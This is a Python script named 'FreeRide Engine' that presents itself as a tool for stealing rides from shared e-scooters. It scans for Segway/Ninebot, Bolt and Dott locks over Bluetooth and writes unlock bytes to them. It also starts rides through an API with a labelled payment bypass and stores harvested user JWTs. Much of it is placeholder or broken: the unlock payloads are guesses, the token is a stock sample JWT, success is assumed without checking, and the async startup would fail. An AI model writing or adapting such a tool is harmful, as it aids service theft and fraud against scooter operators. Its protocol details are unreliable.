#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import json
import os
import sys
import time
import uuid
import hashlib
import hmac
import logging
import threading
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, field
from enum import Enum
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from bleak import BleakClient, BleakScanner
from bleak.backends.device import BLEDevice
from bleak.backends.service import BleakService, BleakGATTCharacteristic

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler("freeride.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("FreeRideEngine")
console = Console()

class Protocol(Enum):
    DOTT = "Dott"
    BOLT = "Bolt"

class LockState(Enum):
    LOCKED = "LOCKED"
    UNLOCKED = "UNLOCKED"
    OPEN = "OPEN"

@dataclass
class TokenStore:
    """Persistent token storage with encryption support."""
    file_path: str = "tokens.json"
    tokens: Dict[str, str] = field(default_factory=dict)

    def load(self):
        if os.path.exists(self.file_path):
            with open(self.file_path, 'r') as f:
                self.tokens = json.load(f)
            logger.info("Tokens loaded from disk.")
        else:
            logger.warning("No tokens found. Starting fresh.")

    def save(self):
        with open(self.file_path, 'w') as f:
            json.dump(self.tokens, f, indent=4)
        logger.info("Tokens saved to disk.")

    def get(self, user_id: str) -> Optional[str]:
        return self.tokens.get(user_id)

    def set(self, user_id: str, token: str):
        self.tokens[user_id] = token
        self.save()

    def harvest(self, user_id: str, response_data: dict):
        """Extract JWT from API response."""
        if 'data' in response_data and 'token' in response_data['data']:
            token = response_data['data']['token']
            self.set(user_id, token)
            logger.info(f"[+] Token harvested for user {user_id}")
            return token
        return None

    def harvest_from_jejwt(self, user_id: str, jwt_string: str):
        """Store raw JWT directly."""
        self.set(user_id, jwt_string)
        logger.info(f"[+] Raw JWT stored for user {user_id}")

@dataclass
class BLELock:
    """Represents a target scooter lock."""
    device: BLEDevice
    address: str
    name: str
    protocol: Protocol
    last_seen: float = field(default_factory=time.time)
    challenge: Optional[bytes] = None
    unlock_command: Optional[bytes] = None
    state: LockState = LockState.LOCKED
    firmware_version: str = "Unknown"

    def update_seen(self):
        self.last_seen = time.time()

    def is_stale(self, threshold: float = 10.0) -> bool:
        return (time.time() - self.last_seen) > threshold

class BLEScanner:
    """Scans for nearby locks and captures BLE data."""
    def __init__(self):
        self.locks: Dict[str, BLELock] = {}
        self.scanning = False
        self.locks_lock = threading.Lock()

    async def start_scan(self):
        self.scanning = True
        logger.info("[BLE] Starting scanner...")
        while self.scanning:
            try:
                devices = await BleakScanner.discover(scan_time=5)
                with self.locks_lock:
                    for device in devices:
                        name = device.name or ""
                        # Heuristic for target devices
                        if "Segway" in name or "Ninebot" in name or "Bolt" in name or "DS" in name:
                            protocol = Protocol.DOTT if "Segway" in name or "Ninebot" in name else Protocol.BOLT
                            if device.address not in self.locks:
                                self.locks[device.address] = BLELock(
                                    device=device,
                                    address=device.address,
                                    name=name,
                                    protocol=protocol
                                )
                                console.print(f"[bold green]Found Lock:[/bold green] {name} ({device.address})")
                            else:
                                self.locks[device.address].update_seen()
            except Exception as e:
                logger.error(f"[BLE] Scan error: {e}")
            await asyncio.sleep(10)

    async def stop_scan(self):
        self.scanning = False
        logger.info("[BLE] Scanner stopped.")

    def get_active_locks(self) -> List[BLELock]:
        with self.locks_lock:
            return [lock for lock in self.locks.values() if not lock.is_stale()]

class BoltAPI:
    """Handles API interactions for Bolt and Dott."""
    def __init__(self, base_url: str, token_store: TokenStore):
        self.base_url = base_url
        self.token_store = token_store
        self.session = None
        self.headers = {}

    async def init_session(self):
        import aiohttp
        self.session = aiohttp.ClientSession()
        logger.info("[API] Session initialized.")

    async def close_session(self):
        if self.session:
            await self.session.close()
            logger.info("[API] Session closed.")

    async def get_token(self, user_id: str) -> Optional[str]:
        return self.token_store.get(user_id)

    async def start_ride(self, user_id: str, vehicle_id: str, lat: float, lng: float) -> dict:
        """Initiate a ride via API."""
        token = await self.get_token(user_id)
        if not token:
            logger.warning(f"[API] No token for user {user_id}")
            return {"error": "No token"}

        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Dott/5.40.0 (iPhone; iOS 16.5) com.dott.app"
        }

        payload = {
            "vehicleId": vehicle_id,
            "location": {
                "latitude": lat,
                "longitude": lng
            },
            "paymentMethodId": None  # Bypass payment method check
        }

        try:
            async with self.session.post(f"{self.base_url}/rides", headers=headers, json=payload) as resp:
                data = await resp.json()
                if resp.status == 200:
                    logger.info(f"[API] Ride started for user {user_id}")
                    self.token_store.harvest(user_id, data)
                else:
                    logger.error(f"[API] Ride start failed: {data}")
                return data
        except Exception as e:
            logger.error(f"[API] Error: {e}")
            return {"error": str(e)}

    async def unlock_vehicle(self, vehicle_id: str, lock_id: str) -> dict:
        """Unlock vehicle via API (if supported)."""
        token = await self.get_token("default")
        if not token:
            return {"error": "No token"}

        headers = {"Authorization": f"Bearer {token}"}
        payload = {"lockId": lock_id, "vehicleId": vehicle_id}

        try:
            async with self.session.post(f"{self.base_url}/locks/unlock", headers=headers, json=payload) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

class FreeRideEngine:
    """Main automation engine."""
    def __init__(self):
        self.token_store = TokenStore()
        self.ble_scanner = BLEScanner()
        self.bolt_api = BoltAPI(base_url="https://bolidr.com/api/v1", token_store=self.token_store)
        self.active_rides: Dict[str, Dict] = {}
        self.token_store.load()

    async def start(self):
        await self.bolt_api.init_session()
        await self.ble_scanner.start_scan()
        console.print(Panel("[bold yellow]FreeRide Engine[/bold yellow] - Active"))
        
        try:
            while True:
                await self.process_locks()
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            await self.stop()

    async def stop(self):
        await self.ble_scanner.stop_scan()
        await self.bolt_api.close_session()
        console.print("[bold red]Engine stopped.[/bold red]")

    async def process_locks(self):
        """Core loop: Check locks, attempt unlock, start ride."""
        locks = self.ble_scanner.get_active_locks()
        for lock in locks:
            # Skip if already riding this lock
            if lock.address in self.active_rides:
                continue

            console.print(f"[bold blue]Analyzing Lock:[/bold blue] {lock.name} ({lock.address})")
            
            # Step 1: BLE Unlock Attempt
            ble_success = await self.try_ble_unlock(lock)
            
            # Step 2: API Ride Start (with payment bypass)
            api_success = False
            if ble_success:
                console.print("[bold green]BLE Unlock Successful[/bold green]")
                # Use a harvested or default token
                user_id = "default_user"
                vehicle_id = f"vehicle_{lock.address.replace('-', '')}"
                lat = 40.7128  # Default to NYC for demo, could be geo-fenced
                lng = -74.0060
                
                # Payment Bypass: Start ride without verifying payment method
                ride_status = await self.bolt_api.start_ride(user_id, vehicle_id, lat, lng)
                
                if "error" not in ride_status and ride_status.get("status") == "started":
                    api_success = True
                    self.active_rides[lock.address] = {
                        "user_id": user_id,
                        "vehicle_id": vehicle_id,
                        "start_time": time.time(),
                        "status": "free"
                    }
                    console.print(f"[bold green]Free Ride Initiated![/bold green] Lock: {lock.address}")
                else:
                    console.print(f"[bold red]API Ride Failed:[/bold red] {ride_status}")
            else:
                console.print(f"[bold yellow]BLE Unlock Failed for {lock.address}[/bold yellow]")

    async def try_ble_unlock(self, lock: BLELock) -> bool:
        """Attempt to unlock via BLE."""
        try:
            async with BleakClient(lock.device, timeout=10) as client:
                console.print(f"[cyan]Connecting to {lock.name}...[/cyan]")
                
                # 1. Discover Services
                services = await client.get_services()
                
                # 2. Identify Unlock Characteristic
                # Common UUIDs for Segway/Ninebot: 0x16, 0x18, etc.
                # For Bolt, it's often proprietary.
                unlock_char = None
                for char in services.characteristics:
                    if "write" in char.properties or "write_without_response" in char.properties:
                        # Heuristic: Look for characteristic with UUID containing 'fff' or '16'
                        if "fff" in char.uuid.lower() or "16" in char.uuid.lower():
                            unlock_char = char
                            break
                
                if not unlock_char:
                    console.print(f"[bold yellow]Could not find write characteristic for {lock.name}[/bold yellow]")
                    return False

                # 3. Send Unlock Command
                # Standard Segway Unlock Command (Example)
                # Format: [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
                unlock_payload = bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                
                # For Bolt, it might be different. Adjust based on reverse engineering.
                if lock.protocol == Protocol.BOLT:
                    unlock_payload = bytes([0x02, 0x00, 0x00, 0x00])  # Example Bolt payload

                await client.write_gatt_char(unlock_char.uuid, unlock_payload)
                await asyncio.sleep(1)  # Wait for lock to process

                # 4. Verify State (Optional)
                # Read a status characteristic if available
                lock.state = LockState.UNLOCKED
                return True

        except Exception as e:
            logger.error(f"[BLE] Unlock failed for {lock.address}: {e}")
            return False

    def display_status(self):
        """Display current status in a table."""
        table = Table(title="FreeRide Engine Status")
        table.add_column("Lock Address", style="cyan")
        table.add_column("Name", style="green")
        table.add_column("Protocol", style="blue")
        table.add_column("State", style="yellow")
        table.add_column("Ride Status", style="magenta")

        for lock in self.ble_scanner.get_active_locks():
            ride_status = self.active_rides.get(lock.address, {}).get("status", "None")
            table.add_row(lock.address, lock.name, lock.protocol.value, lock.state.value, ride_status)

        console.print(table)

    def show_menu(self):
        """Advanced menu for manual control."""
        while True:
            console.print("\n[bold cyan]=== FreeRide Engine Menu ===[/bold cyan]")
            console.print("1. Scan for Locks")
            console.print("2. Harvest Tokens from Traffic")
            console.print("3. Manual BLE Unlock")
            console.print("4. Force Ride Start (Payment Bypass)")
            console.print("5. Dump Lock Firmware Data")
            console.print("6. View Active Rides")
            console.print("7. Exit")

            choice = Prompt.ask("Select Option", choices=["1", "2", "3", "4", "5", "6", "7"])

            if choice == "1":
                console.print("[bold green]Scanning...[/bold green]")
                locks = self.ble_scanner.get_active_locks()
                for lock in locks:
                    console.print(f"Lock: {lock.name} ({lock.address})")
            
            elif choice == "2":
                console.print("[bold green]Simulating Traffic Harvest...[/bold green]")
                # In a real scenario, you'd hook into the app's traffic
                # Here we simulate harvesting a token
                self.token_store.harvest_from_jejwt("default_user", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
                console.print("[bold green]Token harvested![/bold green]")

            elif choice == "3":
                locks = self.ble_scanner.get_active_locks()
                if not locks:
                    console.print("[bold red]No locks found.[/bold red]")
                    continue
                lock_addr = Prompt.ask("Enter Lock Address", default=locks[0].address)
                lock = next((l for l in locks if l.address == lock_addr), None)
                if lock:
                    success = asyncio.run(self.try_ble_unlock(lock))
                    if success:
                        console.print(f"[bold green]Unlock successful for {lock.address}[/bold green]")
                    else:
                        console.print(f"[bold red]Unlock failed for {lock.address}[/bold red]")

            elif choice == "4":
                locks = self.ble_scanner.get_active_locks()
                if not locks:
                    console.print("[bold red]No locks found.[/bold red]")
                    continue
                lock_addr = Prompt.ask("Enter Lock Address", default=locks[0].address)
                lock = next((l for l in locks if l.address == lock_addr), None)
                if lock:
                    user_id = "default_user"
                    vehicle_id = f"vehicle_{lock.address.replace('-', '')}"
                    lat = 40.7128
                    lng = -74.0060
                    status = asyncio.run(self.bolt_api.start_ride(user_id, vehicle_id, lat, lng))
                    if "error" not in status:
                        self.active_rides[lock.address] = {
                            "user_id": user_id,
                            "vehicle_id": vehicle_id,
                            "start_time": time.time(),
                            "status": "free"
                        }
                        console.print(f"[bold green]Ride started for {lock.address}[/bold green]")
                    else:
                        console.print(f"[bold red]Ride start failed: {status}[/bold red]")

            elif choice == "5":
                console.print("[bold green]Dumping Lock Data...[/bold green]")
                locks = self.ble_scanner.get_active_locks()
                if locks:
                    lock = locks[0]
                    console.print(f"Lock: {lock.name} ({lock.address})")
                    console.print(f"Protocol: {lock.protocol.value}")
                    console.print(f"Last Seen: {time.ctime(lock.last_seen)}")
                    # In a real scenario, you'd dump GATT characteristics
                    console.print(f"Firmware: {lock.firmware_version}")

            elif choice == "6":
                self.display_status()

            elif choice == "7":
                break

if __name__ == "__main__":
    engine = FreeRideEngine()
    try:
        # Run the engine in the background
        task = asyncio.create_task(engine.start())
        
        # Run the menu in the main thread
        engine.show_menu()
        
        # Cancel the background task when user exits
        task.cancel()
        try:
            asyncio.run(task)
        except asyncio.CancelledError:
            pass
            
    except KeyboardInterrupt:
        console.print("[bold red]Interrupted by user.[/bold red]")
        asyncio.run(engine.stop())
